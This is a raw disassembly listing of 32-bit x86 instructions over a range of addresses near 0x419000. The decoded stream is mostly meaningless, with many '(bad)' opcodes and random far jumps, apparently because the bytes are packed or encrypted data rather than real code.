  418c56:	inc    ebx
  418c57:	out    0x4c,eax
  418c59:	out    0x27,eax
  418c5b:	ss dec esi
  418c5d:	push   ss
  418c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c5f:	(bad)  
  418c61:	pop    esi
  418c62:	jecxz  0x418c59
  418c64:	jns    0x418c06
  418c66:	mov    bl,0xed
  418c68:	ins    BYTE PTR es:[edi],dx
  418c69:	pop    ecx
  418c6a:	dec    esi
  418c6b:	aas    
  418c6c:	imul   ebp,DWORD PTR [ebx+ebp*4-0x67b3712a],0x7c
  418c74:	pop    esi
  418c75:	inc    esi
  418c76:	or     DWORD PTR [edi],esp
  418c78:	cmp    esp,DWORD PTR ds:0xe8136717
  418c7e:	fisubr WORD PTR [ecx+0x4e]
  418c81:	xor    eax,0x5fadbb40
  418c86:	xor    eax,0xd9918e35
  418c8b:	sbb    DWORD PTR [ebp+0x749f0a81],esi
  418c91:	mov    ecx,0x3a4b05df
  418c96:	pop    edx
  418c97:	pop    ebx
  418c98:	enter  0xc66e,0x8
  418c9c:	fisub  DWORD PTR [ebx-0x25097328]
  418ca2:	js     0x418c3e
  418ca4:	in     eax,0x4b
  418ca6:	fsub   QWORD PTR [edx]
  418ca8:	loop   0x418c69
  418caa:	dec    ecx
  418cab:	stos   BYTE PTR es:[edi],al
  418cac:	in     al,0x49
  418cae:	out    0x7c,eax
  418cb0:	xor    eax,0xb40c077c
  418cb5:	xchg   edi,eax
  418cb6:	je     0x418cea
  418cb8:	test   DWORD PTR [eax],ebx
  418cba:	dec    esp
  418cbb:	xor    ebp,DWORD PTR [ebx+edi*4]
  418cbe:	jecxz  0x418cc6
  418cc0:	in     al,dx
  418cc1:	push   ecx
  418cc2:	fs xchg ecx,eax
  418cc4:	pop    eax
  418cc5:	mov    ds:0x61a18668,al
  418cca:	and    ah,BYTE PTR [ecx+0x62]
  418ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cce:	mov    ah,0xb8
  418cd0:	push   edi
  418cd1:	pop    edx
  418cd2:	xor    dh,0x76
  418cd5:	inc    esp
  418cd6:	mov    eax,0xbf20effe
  418cdb:	repz inc edi
  418cdd:	and    DWORD PTR [edi-0x3e6a0435],edi
  418ce3:	bound  ebx,QWORD PTR [ebp-0x45]
  418ce6:	scas   al,BYTE PTR es:[edi]
  418ce7:	mov    cl,0x77
  418ce9:	dec    edi
  418cea:	add    DWORD PTR [edx-0x5c],esp
  418ced:	or     BYTE PTR [ecx],bh
  418cef:	sub    al,0xc2
  418cf1:	cli    
  418cf2:	bound  edi,QWORD PTR [eax-0x6a]
  418cf5:	xchg   bh,dl
  418cf7:	repnz xchg ebp,eax
  418cf9:	add    eax,0x792a058
  418cfe:	push   ss
  418cff:	test   eax,0x6652d3a9
  418d04:	(bad)  
  418d05:	std    
  418d06:	add    eax,0x8a948812
  418d0b:	cld    
  418d0c:	mov    ds:0xf1b72e82,al
  418d11:	add    esi,DWORD PTR [edi+0x6e]
  418d14:	sti    
  418d15:	adc    eax,0xc09f8841
  418d1a:	add    eax,0x3fbe369b
  418d1f:	and    esp,esi
  418d21:	jecxz  0x418d79
  418d23:	ret    0xfd47
  418d26:	mov    ds:0xfb678810,eax
  418d2b:	xlat   BYTE PTR ds:[ebx]
  418d2c:	and    ah,BYTE PTR [esi+0x6c989af2]
  418d32:	cmp    eax,DWORD PTR [edi]
  418d34:	xor    eax,0x15a49a4f
  418d39:	ins    BYTE PTR es:[edi],dx
  418d3a:	dec    ebp
  418d3b:	in     eax,dx
  418d3c:	or     DWORD PTR [edx-0x651448db],eax
  418d42:	out    0xf0,al
  418d44:	mov    ecx,eax
  418d46:	jge    0x418db4
  418d48:	fwait
  418d49:	inc    esi
  418d4a:	(bad)  
  418d4b:	cli    
  418d4c:	xchg   ebp,eax
  418d4d:	and    al,0xe3
  418d4f:	pop    esi
  418d50:	xor    BYTE PTR [eax+0x35],bh
  418d53:	mov    cs,WORD PTR [bx+si+0x39]
  418d57:	inc    edx
  418d58:	lea    eax,[ebx]
  418d5a:	pop    esp
  418d5b:	xor    DWORD PTR [edx+eax*1+0x27],ecx
  418d5f:	inc    ecx
  418d60:	int3   
  418d61:	lds    esp,FWORD PTR [edx-0x16ec5713]
  418d67:	loopne 0x418dcd
  418d69:	sbb    al,0xf0
  418d6b:	das    
  418d6c:	or     DWORD PTR [eax-0x6e],ebp
  418d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d70:	xlat   BYTE PTR ds:[ebx]
  418d71:	cld    
  418d72:	mov    esp,0x5bfd5d62
  418d77:	jle    0x418d7a
  418d79:	rcl    ch,cl
  418d7b:	imul   esp,DWORD PTR [ecx],0x7eb41edc
  418d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d82:	icebp  
  418d83:	imul   esp,DWORD PTR [ecx+0x1d9cbe82],0xb0537d59
  418d8d:	jae    0x418d8c
  418d8f:	mov    ebx,0xcd5ebf53
  418d94:	mov    WORD PTR [edi+0x11215349],?
  418d9a:	retf   
  418d9b:	sub    eax,0x79cf82ac
  418da0:	movd   mm4,DWORD PTR ds:0xbeb20c11
  418da7:	shl    BYTE PTR [ebp-0x4b7e3c39],cl
  418dad:	push   eax
  418dae:	mov    WORD PTR [esi+0x77],fs
  418db1:	rol    DWORD PTR [eax-0x50],cl
  418db4:	call   0x79c8:0xa7ab6615
  418dbb:	cld    
  418dbc:	aaa    
  418dbd:	adc    DWORD PTR [eax+0x2dbad8a9],ebx
  418dc3:	adc    eax,0x28b5caea
  418dc8:	cmp    cl,BYTE PTR [ebp+0x9]
  418dcb:	scas   eax,DWORD PTR es:[edi]
  418dcc:	and    DWORD PTR [esi-0x34630307],ecx
  418dd2:	cmp    al,0x62
  418dd4:	das    
  418dd5:	rcr    BYTE PTR [edx-0x589aa6ac],cl
  418ddb:	lock sbb bl,bh
  418dde:	push   edx
  418ddf:	mov    ch,0x3b
  418de1:	fbstp  TBYTE PTR [ebp+ebp*2+0x25]
  418de5:	inc    esi
  418de6:	test   al,0xbf
  418de8:	mov    al,ds:0x9f1821e5
  418ded:	jg     0x418dcb
  418def:	push   0x14
  418df1:	into   
  418df2:	cs dec ebx
  418df4:	mov    ebx,0x6f6621e0
  418df9:	adc    esp,eax
  418dfb:	clc    
  418dfc:	mov    eax,0x19efaee8
  418e01:	mov    esp,0x977decbe
  418e06:	gs mov bh,0x27
  418e09:	xchg   edi,eax
  418e0a:	xchg   edx,eax
  418e0b:	aam    0x86
  418e0d:	inc    esi
  418e0e:	test   eax,0x7533b786
  418e13:	mov    bh,0xcb
  418e15:	jl     0x418e30
  418e17:	(bad)  
  418e18:	adc    al,0x55
  418e1a:	pushf  
  418e1b:	int3   
  418e1c:	jb     0x418dda
  418e1e:	daa    
  418e1f:	ret    
  418e20:	sub    BYTE PTR [esi],cl
  418e22:	mov    ecx,0x3ca17b14
  418e27:	int    0xc5
  418e29:	loopne 0x418e13
  418e2b:	mov    dh,0x59
  418e2d:	aad    0xd6
  418e2f:	xchg   BYTE PTR [edx],ch
  418e31:	gs xchg edi,eax
  418e33:	js     0x418de0
  418e35:	jne    0x418e81
  418e37:	adc    eax,DWORD PTR [edi]
  418e39:	dec    ebp
  418e3a:	pop    esp
  418e3b:	mov    BYTE PTR [edx],dl
  418e3d:	scas   eax,DWORD PTR es:[edi]
  418e3e:	pop    ebx
  418e3f:	cmc    
  418e40:	outs   dx,DWORD PTR ds:[esi]
  418e41:	sbb    eax,0xdd5f436c
  418e46:	outs   dx,DWORD PTR ds:[esi]
  418e47:	in     al,dx
  418e48:	cmp    BYTE PTR [eax-0x3e2baa6],bl
  418e4e:	fs push eax
  418e50:	arpl   WORD PTR [eax+0x70],dx
  418e53:	adc    eax,0xe9375e53
  418e58:	inc    BYTE PTR [ebp+0x5]
  418e5b:	retf   
  418e5c:	sahf   
  418e5d:	sub    eax,0xde91d9bc
  418e62:	sub    DWORD PTR [ebx],edi
  418e64:	fwait
  418e65:	repz mov al,0x3d
  418e68:	xor    BYTE PTR [ecx+ebp*1+0x4519eb08],bh
  418e6f:	ret    0x7757
  418e72:	cmp    BYTE PTR [ebx+0x27],dh
  418e75:	shl    DWORD PTR [ecx],1
  418e77:	jp     0x418eb7
  418e79:	(bad)  
  418e7a:	ret    
  418e7b:	sbb    DWORD PTR [edi+edi*8],0x43837f0d
  418e82:	inc    ebp
  418e83:	pop    esp
  418e84:	pop    ds
  418e85:	pop    edi
  418e86:	push   ebx
  418e87:	mov    dh,0xa9
  418e89:	gs out dx,al
  418e8b:	mov    eax,ds:0x6a598e35
  418e90:	repnz mov ebp,DWORD PTR [ecx+0x34]
  418e94:	add    eax,0xe5c3d9c2
  418e99:	retf   
  418e9a:	xor    dl,BYTE PTR [ebp+0x4de4ab7f]
  418ea0:	adc    BYTE PTR [ebx+0x11396294],ch
  418ea6:	fstp   st(2)
  418ea8:	test   DWORD PTR [ecx-0x6658853],eax
  418eae:	mov    dl,0x3b
  418eb0:	mov    eax,0xd12d5e5a
  418eb5:	in     eax,0x7d
  418eb7:	popa   
  418eb8:	push   eax
  418eb9:	xchg   ebp,eax
  418eba:	rcr    DWORD PTR fs:[ebp+0x21],cl
  418ebe:	call   0x671e28f7
  418ec3:	or     BYTE PTR [esi-0x181f86cc],0xc1
  418eca:	mov    ecx,0xb7c78d5b
  418ecf:	xrelease mov BYTE PTR [ebx-0x44],bl
  418ed3:	mov    ebx,0xb0bd0a
  418ed8:	scas   eax,DWORD PTR es:[edi]
  418ed9:	fwait
  418eda:	repz inc eax
  418edc:	call   0x325a:0x94f7776d
  418ee3:	mov    al,0x31
  418ee5:	sbb    ah,0x46
  418ee8:	push   ecx
  418ee9:	or     BYTE PTR [edi],0x21
  418eec:	(bad)  
  418eed:	lds    edx,FWORD PTR [esi-0x40314ca7]
  418ef3:	mov    esp,0x106cd83
  418ef8:	into   
  418ef9:	sbb    BYTE PTR [eax+eiz*2+0x1299d548],bh
  418f00:	imul   eax,DWORD PTR [esi+0x47],0xa
  418f04:	ret    
  418f05:	fimul  DWORD PTR [eax]
  418f07:	data16 daa 
  418f09:	xchg   esi,eax
  418f0a:	pop    ebp
  418f0b:	sbb    DWORD PTR [edi-0x53],esp
  418f0e:	mov    dl,BYTE PTR [esi-0x3f44c228]
  418f14:	sub    eax,0xe27772ea
  418f19:	test   al,0x3b
  418f1b:	pop    edi
  418f1c:	add    dl,bl
  418f1e:	fsubr  DWORD PTR [edi]
  418f20:	xor    ebx,edi
  418f22:	adc    BYTE PTR [ebx],al
  418f24:	enter  0x695d,0x6d
  418f28:	ja     0x418f80
  418f2a:	out    0xa3,eax
  418f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f2d:	pop    ds
  418f2e:	in     al,0xb4
  418f30:	jge    0x418ec3
  418f32:	lods   al,BYTE PTR ds:[esi]
  418f33:	or     ah,cl
  418f35:	push   ecx
  418f36:	pop    ecx
  418f37:	fiadd  WORD PTR [eax-0x30b35735]
  418f3d:	pop    edx
  418f3e:	ds cmc 
  418f40:	jbe    0x418f02
  418f42:	jmp    0x307318f4
  418f47:	sbb    dh,BYTE PTR [eax-0x70186f6d]
  418f4d:	(bad)  
  418f4f:	dec    ebx
  418f50:	inc    edx
  418f51:	retf   0x463a
  418f54:	push   ecx
  418f55:	(bad)  
  418f56:	retf   0x2750
  418f59:	xchg   ebp,eax
  418f5a:	sub    dl,dh
  418f5c:	cmp    eax,ebx
  418f5e:	imul   edx,DWORD PTR [eax+0x68],0xffffffa5
  418f62:	aad    0x64
  418f64:	push   cs
  418f65:	cmp    ecx,ebx
  418f67:	arpl   WORD PTR ds:[ecx+edi*4+0xa],bx
  418f6c:	pusha  
  418f6d:	lahf   
  418f6e:	repnz rcl BYTE PTR [ecx+ecx*2+0x37],cl
  418f73:	jo     0x418fc9
  418f75:	in     eax,0xb6
  418f77:	ja     0x418f38
  418f79:	xor    DWORD PTR [edx],ebp
  418f7b:	jae    0x418faa
  418f7d:	clc    
  418f7e:	mov    esi,0xd8027228
  418f83:	mov    edi,0x53152605
  418f88:	popf   
  418f89:	or     ecx,DWORD PTR [esi]
  418f8b:	enter  0x75cc,0x4b
  418f8f:	mov    WORD PTR [ecx],ss
  418f91:	daa    
  418f92:	loop   0x419008
  418f94:	and    BYTE PTR [esi-0x77],ah
  418f97:	lahf   
  418f98:	mov    DWORD PTR [ecx-0x52],0xdc9fb7ab
  418f9f:	fdiv   DWORD PTR [ecx-0x6]
  418fa2:	and    BYTE PTR [ebx-0x16],cl
  418fa5:	and    ebp,eax
  418fa7:	jo     0x418f2d
  418fa9:	icebp  
  418faa:	jmp    0x2ea7:0x2e8daf3f
  418fb1:	sbb    DWORD PTR [eax-0x1c57093f],0xffffffd8
  418fb8:	outs   dx,DWORD PTR ds:[esi]
  418fb9:	mov    al,al
  418fbb:	push   ss
  418fbc:	pop    DWORD PTR [edi-0x343e08a6]
  418fc2:	shl    ecx,1
  418fc4:	js     0x41901f
  418fc6:	in     eax,dx
  418fc7:	xchg   edx,eax
  418fc8:	pop    edi
  418fc9:	or     esi,DWORD PTR [ecx-0x41]
  418fcc:	mov    eax,ds:0x1c0c3e06
  418fd1:	sub    dh,BYTE PTR [edi]
  418fd3:	mov    ecx,0x7553e7b1
  418fd8:	test   eax,0x98b72de5
  418fdd:	ret    0xf8de
  418fe0:	hlt    
  418fe1:	aas    
  418fe2:	bound  edi,QWORD PTR [ebx]
  418fe4:	fnsetpm(287 only) 
  418fe6:	pop    ds
  418fe7:	hlt    
  418fe8:	loope  0x418f87
  418fea:	aaa    
  418feb:	xchg   esp,eax
  418fec:	lea    ebx,[ebx+0x4dd4a39d]
  418ff2:	add    esi,DWORD PTR [ebp+0x57e37ffb]
  418ff8:	dec    edx
  418ff9:	out    0xb,eax
  418ffb:	jb     0x418fa4
  418ffd:	jbe    0x418fd0
  418fff:	sbb    eax,0x599f51b8
  419004:	mov    ah,0x93
  419006:	dec    edi
  419007:	aas    
  419008:	adc    BYTE PTR [eax],dh
  41900a:	mov    bh,0x5b
  41900c:	jge    0x418ffb
  41900e:	cmp    ecx,DWORD PTR [edx]
  419010:	bnd ret 0x3cf6
  419014:	das    
  419015:	fisttp WORD PTR [esi-0xb]
  419018:	jbe    0x418ffa
  41901a:	enter  0x6520,0xd4
  41901e:	lds    ebp,FWORD PTR [edx-0x8]
  419021:	or     ebp,DWORD PTR [esi]
  419023:	pop    ebx
  419024:	sbb    esi,DWORD PTR [eax-0x28]
  419027:	cwde   
  419028:	inc    edx
  419029:	xor    DWORD PTR ds:0xd2d6d664,0x3ab43a07
  419033:	push   ss
  419034:	test   DWORD PTR [ebp-0x55],edi
  419037:	lods   eax,DWORD PTR ds:[esi]
  419038:	stc    
  419039:	outs   dx,BYTE PTR ds:[esi]
  41903a:	jecxz  0x419076
  41903c:	out    dx,eax
  41903d:	inc    ebp
  41903e:	push   0x3d
  419040:	add    ecx,DWORD PTR [edi+0xed3acd6]
  419046:	mov    ebp,0xb29c614c
  41904b:	popf   
  41904c:	mov    dl,0xdd
  41904e:	inc    ecx
  41904f:	adc    al,0xad
  419051:	sbb    al,0x57
  419053:	add    dl,ch
  419055:	test   eax,0x5beb4d20
  41905a:	add    bh,BYTE PTR [ebp+0x40]
  41905d:	loop   0x4190b8
  41905f:	fs mov eax,0x3073a0b1
  419065:	mov    edx,0xb529e020
  41906a:	clc    
  41906b:	jmp    0x419075
  41906d:	rcl    edi,cl
  41906f:	sbb    edi,DWORD PTR [ecx+0x77383397]
  419075:	gs mov ch,0x44
  419078:	int3   
  419079:	or     BYTE PTR [eax+edi*2-0x4f],dh
  41907d:	mov    esp,0x80b520f4
  419082:	rol    DWORD PTR ds:0xea560348,cl
  419088:	cld    
  419089:	call   0x6269b37f
  41908e:	mov    ah,0xc2
  419090:	daa    
  419091:	inc    edi
  419092:	je     0x4190c6
  419094:	ror    DWORD PTR [ebp+0x2f8c87b0],0x4b
  41909b:	(bad)  
  41909c:	fcmovnbe st,st(0)
  41909e:	loop   0x419060
  4190a0:	add    bh,bh
  4190a2:	xchg   esp,eax
  4190a3:	adc    ah,ah
  4190a5:	test   DWORD PTR [ebx-0x7b77b894],esi
  4190ab:	mov    bl,0x22
  4190ad:	mov    esp,0xef788cf7
  4190b2:	sbb    eax,0x8e10adf4
  4190b7:	test   DWORD PTR ds:0xce924a76,ecx
  4190bd:	inc    eax
  4190be:	mov    BYTE PTR [esi-0xb],al
  4190c1:	cmp    ebx,DWORD PTR [esi+eiz*2-0x7f357836]
  4190c8:	push   eax
  4190c9:	pop    ds
  4190ca:	popf   
  4190cb:	arpl   WORD PTR [ebx-0x1ba7e890],dx
  4190d1:	adc    DWORD PTR [eax],eax
  4190d3:	or     DWORD PTR [esi+0x3bd488b1],0x1070ed53
  4190dd:	push   0x19f9a004
  4190e2:	push   esp
  4190e3:	push   cs
  4190e4:	add    eax,0x5b1d6306
  4190e9:	pop    eax
  4190ea:	fld    TBYTE PTR [esi]
  4190ec:	data16 int3 
  4190ee:	xchg   esi,eax
  4190ef:	sub    al,al
  4190f1:	dec    edx
  4190f2:	push   esi
  4190f3:	mov    al,ds:0x35497a7c
  4190f8:	inc    ecx
  4190f9:	cld    
  4190fa:	push   esp
  4190fb:	or     DWORD PTR [edx+ebp*1-0x669825ee],0x7b
  419103:	mov    al,ds:0x8cb39951
  419108:	icebp  
  419109:	xchg   ebp,eax
  41910a:	cmp    al,0xac
  41910c:	lods   eax,DWORD PTR ds:[esi]
  41910d:	sbb    eax,0x4c3475d8
  419112:	mov    ebx,DWORD PTR [ebx-0x7f1b223e]
  419118:	cmc    
  419119:	into   
  41911a:	mov    ebp,0x2c2e7b40
  41911f:	data16 cli 
  419121:	imul   ebp,DWORD PTR [eax+eax*8+0x4643a243],0x865709d
  41912c:	xchg   edx,eax
  41912d:	fstp   DWORD PTR [ebx+0x211e005c]
  419133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419134:	outs   dx,BYTE PTR ds:[esi]
  419135:	dec    esp
  419136:	loopne 0x419118
  419138:	dec    ebx
  419139:	cmp    ebp,DWORD PTR [ecx]
  41913b:	jecxz  0x41919c
  41913d:	sbb    bh,BYTE PTR [ecx+0x3d]
  419140:	add    eax,0x37a1569c
  419145:	stos   BYTE PTR es:[edi],al
  419146:	dec    ebp
  419147:	pop    esi
  419148:	pop    ss
  419149:	push   edi
  41914a:	add    eax,0x92396cfd
  41914f:	jnp    0x41913d
  419151:	test   edx,esp
  419153:	clc    
  419154:	out    dx,eax
  419155:	and    DWORD PTR [edi+0x20],ecx
  419158:	iret   
  419159:	jp     0x419123
  41915b:	xor    al,0x8c
  41915d:	ret    0x792e
  419160:	fwait
  419161:	push   cs
  419162:	outs   dx,DWORD PTR ds:[esi]
  419163:	fst    QWORD PTR [ecx]
  419165:	mov    al,BYTE PTR [ebp+ebp*8+0x2c]
  419169:	out    0xfb,eax
  41916b:	shl    BYTE PTR [ebx+esi*4-0x4],cl
  41916f:	xlat   BYTE PTR ds:[ebx]
  419170:	xchg   ecx,eax
  419171:	mov    dl,0xa3
  419173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419174:	adc    al,0xb1
  419176:	(bad)
  419179:	push   esp
  41917a:	stc    
  41917b:	lds    esp,FWORD PTR [edx-0x65]
  41917e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41917f:	xor    BYTE PTR [eax],bl
  419181:	fistp  QWORD PTR ds:0x587c5743
  419187:	push   0xc2c0507e
  41918c:	or     ebp,edi
  41918e:	push   ecx
  41918f:	xor    eax,0x952b943b
  419194:	jno    0x4191ac
  419196:	pop    eax
  419197:	loop   0x4191f2
  419199:	mov    ss:0xa6f4e33d,al
  41919f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191a0:	inc    edx
  4191a1:	xchg   esp,eax
  4191a2:	and    eax,0x2d763473
  4191a7:	sub    eax,0x8f51888f
  4191ac:	es fwait
  4191ae:	scas   eax,DWORD PTR es:[edi]
  4191af:	push   ss
  4191b0:	cmp    DWORD PTR [ebx],0x4a
  4191b3:	aam    0x4f
  4191b5:	push   ss
  4191b6:	jp     0x419232
  4191b8:	inc    edx
  4191b9:	fisttp QWORD PTR gs:[edx-0x3c]
  4191bd:	dec    esi
  4191be:	outs   dx,DWORD PTR ds:[esi]
  4191bf:	push   es
  4191c0:	les    edx,FWORD PTR [eax-0x5e]
  4191c3:	enter  0x8dfa,0x5b
  4191c7:	jb     0x419218
  4191c9:	sbb    al,0xa6
  4191cb:	xor    al,0x6e
  4191cd:	mov    ch,cl
  4191cf:	outs   dx,DWORD PTR ds:[esi]
  4191d0:	cmp    ch,BYTE PTR [ebx-0x4d]
  4191d3:	and    ah,ch
  4191d5:	inc    edi
  4191d6:	sub    DWORD PTR [ebp-0x66b50f4b],ebx
  4191dc:	adc    bh,0xa8
  4191df:	xor    bh,BYTE PTR [ebx-0x50]
  4191e2:	stc    
  4191e3:	repz sub BYTE PTR [edx-0x49],dh
  4191e7:	out    dx,al
  4191e8:	hlt    
  4191e9:	mov    bl,0x74
  4191eb:	(bad)  
  4191ec:	jne    0x419180
  4191ee:	test   al,0x58
  4191f0:	sysenter 
  4191f2:	mov    dh,ah
  4191f4:	gs jmp 0x93fa7941
  4191fa:	mov    bh,bh
  4191fc:	into   
  4191fd:	call   0x4551a29e
  419202:	jge    0x419219
  419204:	jge    0x4191d4
  419206:	jle    0x41919d
  419208:	push   ecx
  419209:	jmp    0x31b8c3e
  41920e:	(bad)  
  41920f:	int3   
  419210:	ja     0x4191fa
  419212:	sbb    ebx,DWORD PTR ds:0x9af0d52
  419218:	sub    eax,0x27602f24
  41921d:	cmp    DWORD PTR [edi-0x53e41be4],ebx
  419223:	inc    edx
  419224:	or     eax,0x19aa91f9
  419229:	jecxz  0x4191bf
  41922b:	scas   al,BYTE PTR es:[edi]
  41922c:	cmp    esp,edx
  41922e:	punpckhwd mm3,QWORD PTR [ecx]
  419231:	test   esi,eax
  419233:	inc    esi
  419235:	mov    ebp,0xbe76cb2d
  41923a:	sbb    DWORD PTR [esi+0x2a282cad],esp
  419240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419241:	mov    esi,0xdd252de8
  419246:	ds nop
  419248:	into   
  419249:	pushf  
  41924a:	aas    
  41924b:	xchg   ebx,eax
  41924c:	sbb    esi,DWORD PTR [ebp+0x2f4c0dd5]
  419252:	rol    DWORD PTR [esi-0x18],cl
  419255:	cmp    ah,0xe8
  419258:	inc    edi
  419259:	or     BYTE PTR [ecx-0x76b037c3],ch
  41925f:	add    ebx,DWORD PTR [edi]
  419261:	loope  0x41925d
  419263:	push   esi
  419264:	jne    0x41924e
  419266:	cwde   
  419267:	push   cs
  419268:	mov    bh,0x5a
  41926a:	ja     0x4192c7
  41926c:	push   esp
  41926d:	jmp    0x208fc059
  419272:	out    0x5a,eax
  419274:	into   
  419275:	pushf  
  419276:	mov    edx,0x27858739
  41927b:	mov    al,0x7d
  41927d:	xchg   BYTE PTR [ebp-0x2151a69e],dh
  419283:	push   ecx
  419284:	jmp    0x419210
  419286:	adc    al,0x40
  419288:	fnstcw WORD PTR [ebp+0x6966289b]
  41928e:	xor    DWORD PTR [edi+0x34],edi
  419291:	fst    QWORD PTR [ebx+0x16]
  419294:	fisub  DWORD PTR [edx]
  419296:	ins    BYTE PTR es:[edi],dx
  419297:	or     al,0xd0
  419299:	sbb    al,0x7a
  41929b:	jmp    0xe59c6ddb
  4192a0:	mov    al,ds:0x75d91fc
  4192a5:	and    BYTE PTR [edi-0x3a],0xd8
  4192a9:	fldcw  WORD PTR [esi-0x26970b1b]
  4192af:	sub    DWORD PTR [esi+0x72],0xdca2c7a5
  4192b6:	dec    esp
  4192b7:	test   DWORD PTR [ebp+0x275eabbf],esp
  4192bd:	mov    ah,0xe3
  4192bf:	jbe    0x41926d
  4192c1:	mov    al,ds:0x17401d79
  4192c6:	(bad)  
  4192c7:	jecxz  0x419302
  4192c9:	mov    WORD PTR [ebx],ds
  4192cb:	les    edx,FWORD PTR [ebx]
  4192cd:	push   0x41
  4192cf:	mov    esp,0x70874b64
  4192d4:	ret    0xa19
  4192d7:	adc    al,0x2f
  4192d9:	in     eax,dx
  4192da:	shl    DWORD PTR [esi-0x34],1
  4192dd:	mov    ebx,0x92d122da
  4192e2:	sub    al,0xb5
  4192e4:	add    al,0x58
  4192e6:	inc    eax
  4192e7:	xor    al,ch
  4192e9:	pop    ebx
  4192ea:	in     eax,dx
  4192eb:	push   esp
  4192ec:	cs cli 
  4192ee:	mov    DWORD PTR [edx],0xa6133ea7
  4192f4:	mov    eax,0x17da1c8f
  4192f9:	pop    edx
  4192fa:	mov    al,0xe6
  4192fc:	or     bl,dl
  4192fe:	push   edx
  4192ff:	(bad)  
  419300:	out    0x22,eax
  419302:	mov    al,0xd5
  419304:	in     al,dx
  419305:	sbb    al,0x58
  419307:	xchg   BYTE PTR ds:0x36569c3f,cl
  41930d:	push   esi
  41930e:	sub    BYTE PTR [ecx-0x39bd525],al
  419314:	idiv   edi
  419316:	jmp    0x419338
  419318:	mov    edi,0x1e4b2a1f
  41931d:	pop    es
  41931e:	adc    BYTE PTR [ebx-0x61],0x64
  419322:	xlat   BYTE PTR ds:[ebx]
  419323:	lahf   
  419324:	sbb    bl,cl
  419326:	popf   
  419327:	mov    eax,ds:0xbaf1e079
  41932c:	and    BYTE PTR [edx-0x6],ah
  41932f:	push   0x90c9f2b8
  419334:	ret    0x1929
  419337:	pop    edi
  419338:	dec    esi
  419339:	dec    edi
  41933a:	mov    gs,WORD PTR [edx+0x22]
  41933d:	imul   esi,DWORD PTR [ecx],0xffffffc7
  419340:	bound  eax,QWORD PTR [eax+0x2cebfd47]
  419346:	pop    ecx
  419347:	stos   BYTE PTR es:[edi],al
  419348:	adc    eax,0x97718f5e
  41934d:	xor    DWORD PTR [ecx],ebx
  41934f:	push   cs
  419350:	jne    0x419363
  419352:	dec    ecx
  419353:	imul   edi,esp,0x7f
  419356:	clc    
  419357:	and    eax,0xde8b7fe9
  41935c:	fwait
  41935d:	lea    eax,[esi]
  41935f:	mov    cl,BYTE PTR ds:[ecx-0x71]
  419363:	pop    esp
  419364:	xor    eax,0x3d7c3208
  419369:	call   0x32b9:0x5871556e
  419370:	and    BYTE PTR [esi+0x37b34e15],ch
  419376:	inc    eax
  419377:	aaa    
  419378:	jns    0x4193f6
  41937a:	mov    ds:0x373fa7fc,eax
  41937f:	into   
  419380:	je     0x4193b3
  419382:	mov    ds:0x4672c4b6,al
  419387:	leave  
  419388:	push   es
  419389:	int3   
  41938a:	adc    eax,0xa2db2d61
  41938f:	addr16 cwde 
  419391:	popf   
  419392:	jmp    0x717ac35
  419397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419398:	fist   DWORD PTR [esp+ebx*2-0x46]
  41939c:	adc    eax,edx
  41939e:	xor    cl,BYTE PTR [edi-0x717f0d3d]
  4193a4:	cmp    dh,bh
  4193a6:	add    esi,ebp
  4193a8:	dec    ebx
  4193a9:	jnp    0x4193c2
  4193ab:	pop    es
  4193ac:	add    BYTE PTR [ecx+esi*1],ah
  4193af:	(bad)  
  4193b0:	jmp    0xfb64:0x71c7ed16
  4193b7:	mov    al,ds:0xcdd790c9
  4193bc:	mov    ebp,0x37058a22
  4193c1:	inc    ebp
  4193c2:	pop    ebx
  4193c3:	or     dl,cl
  4193c5:	clc    
  4193c6:	fnstsw WORD PTR [edx+0x66e9d45c]
  4193cc:	and    DWORD PTR [eax+eax*4-0x6597ab3c],ecx
  4193d3:	mov    ds:0x53b36f64,al
  4193d8:	or     cl,0x9a
  4193db:	pop    ds
  4193dc:	test   al,0x3c
  4193de:	sahf   
  4193df:	aam    0xed
  4193e1:	mov    ecx,0x49a7d663
  4193e6:	inc    ebx
  4193e7:	jmp    0x7339:0x43c0a47a
  4193ee:	jge    0x4193df
  4193f0:	repz data16 mov dh,0x7b
  4193f4:	mov    edx,0x64d858c6
  4193f9:	ja     0x419440
  4193fb:	jmp    0x419425
  4193fd:	cmp    BYTE PTR [edx],bl
  4193ff:	inc    ebx
  419400:	enter  0xa4c8,0xd4
  419404:	sbb    ecx,DWORD PTR [edi-0x2a]
  419407:	xchg   BYTE PTR [ebx-0x66a889db],ah
  41940d:	ins    DWORD PTR es:[edi],dx
  41940e:	nop
  41940f:	mov    ah,BYTE PTR [edi+ecx*1]
  419412:	pop    ecx
  419413:	cmp    ebp,ebp
  419415:	out    0x59,al
  419417:	jg     0x419462
  419419:	loopne 0x419432
  41941b:	and    esp,ecx
  41941d:	fnstsw WORD PTR [ebx-0x543af45]
  419423:	dec    eax
  419424:	inc    edx
  419425:	jle    0x419468
  419427:	xor    al,0x34
  419429:	inc    ebx
  41942a:	popf   
  41942b:	cmp    eax,0x25568df4
  419430:	jo     0x419443
  419432:	(bad)  
  419433:	int    0xab
  419435:	mov    dh,BYTE PTR [edx+esi*8-0x2c]
  419439:	std    
  41943a:	lahf   
  41943b:	dec    esi
  41943c:	add    ah,al
  41943e:	int3   
  41943f:	xchg   edi,eax
  419440:	mov    ?,WORD PTR [eax]
  419442:	or     eax,0x4ca1296
  419447:	push   ss
  419448:	pop    ss
  419449:	xor    eax,0xe43ad1a4
  41944e:	je     0x419484
  419450:	scas   al,BYTE PTR es:[edi]
  419451:	aas    
  419452:	pop    esi
  419453:	mov    bh,0xed
  419455:	outs   dx,BYTE PTR ds:[esi]
  419456:	lea    esi,[ecx-0x314d30b1]
  41945c:	fmul   DWORD PTR [edx]
  41945e:	push   es
  41945f:	retf   0xab7f
  419462:	push   ds
  419463:	fcom   QWORD PTR [ecx-0x1b]
